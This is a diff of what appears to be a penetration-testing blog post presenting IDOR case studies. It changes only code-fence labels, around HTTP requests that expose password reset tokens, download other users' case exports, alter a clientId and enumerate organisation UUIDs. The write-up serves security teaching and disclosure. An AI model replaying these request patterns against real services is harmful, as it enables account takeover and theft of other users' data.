@@ -54,7 +54,7 @@ Now, let's delve into a few real-world case studies that we've encountered durin
 In this case study, we will explore a scenario where a critical Insecure Direct Object Reference (IDOR) vulnerability allowed us to access sensitive information including password reset tokens using a simple manipulation of usernames. This vulnerability led to unauthorised account takeover, jeopardising user accounts and their associated data.
 
 **Request:**
-```
+```http
 GET /cases-api/getUserByUsername?username=AdminUser HTTP/2  
 Host: <REDACTED> 
 Cookie: <REDACTED>  
@@ -67,7 +67,7 @@ Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
 ```
 
 **Response:**
-```
+```http
 HTTP/2 200 OK  
 Date: Wed, 07 Jun 2023 12:51:27 GMT  
 Content-Type: text/html; charset=UTF-8  
@@ -104,7 +104,7 @@ After sending the password reset link, we can see the password reset token in th
 
 **Response**
 
-```
+```http
 HTTP/2 200 OK  
 Date: Wed, 07 Jun 2023 12:51:27 GMT  
 Content-Type: text/html; charset=UTF-8  
@@ -155,7 +155,7 @@ It was possible to change the `<CASE_ID>` to any arbitrary case ID in order to d
 
 **Request:**
 
-```
+```http
 GET /api/exports/zip/download/<CASE_ID> HTTP/2
 Host: <REDACTED>
 ﻿﻿Cookie: <REDACTED>
@@ -168,7 +168,7 @@ Accept-Encoding: gzip, deflate
 
 **Response:**
 
-```
+```http
 HTTP/2 200 OK
 Date: Thu, 08 Jun 2023 12:58:42 GMT
 ﻿﻿Content-Type: application/zip
@@ -199,7 +199,7 @@ We identified a _**clientId**_ parameter within a POST request initiated to `/a
 
 **Request:**
 
-```
+```http
 POST /api/user/userUpdateManagement HTTP/2  
 Host: <REDACTED> 
 Accept: application/json, text/javascript, */*; q=0.01  
@@ -243,7 +243,7 @@ _..[SNIP].._
 
 **Response:**
 
-```
+```http
 HTTP/2 200 OK  
 Date: Mon, 15 May 2023 12:33:03 GMT  
 Content-Type: application/json; charset=utf-8  
@@ -283,7 +283,7 @@ To validate this issue, we created two organisations, OrgA and OrgB, both of whi
 
 **Request:**
 
-```
+```http
 GET /api/v1/profile/data/c/39f83650-14af-422b-8771-555213ec27ef HTTP/1.1
 Host: redacted.co.uk
 Cookie: <Redacted>
@@ -291,7 +291,7 @@ Cookie: <Redacted>
 
 **Response:**
 
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx
 Date: Tue, 13 June 2023 11:32:08 GMT  
@@ -339,7 +339,7 @@ Content-Type: application/json
 We verified the presence of an IDOR vulnerability, but obtaining the UUIDs of other target organisations was challenging. However, during the signup process, we came across an API request that allowed us to enumerate an organisation's UUID by performing username enumeration on the organisation's owner.
 
 **Request:**
-```
+```http
 POST /api/organistaion/?e=punit@redacted.com HTTP/2  
 Host: <REDACTED> 
 Accept: application/json, text/javascript, */*; q=0.01  
@@ -351,7 +351,7 @@ Referer: https://redacted.co.uk
 
 **Response:**
 
-```
+```http
 HTTP/1.1 200 OK
 Server: nginx
 Date: Mon, 15 May 2023 12:36:03 GMT  
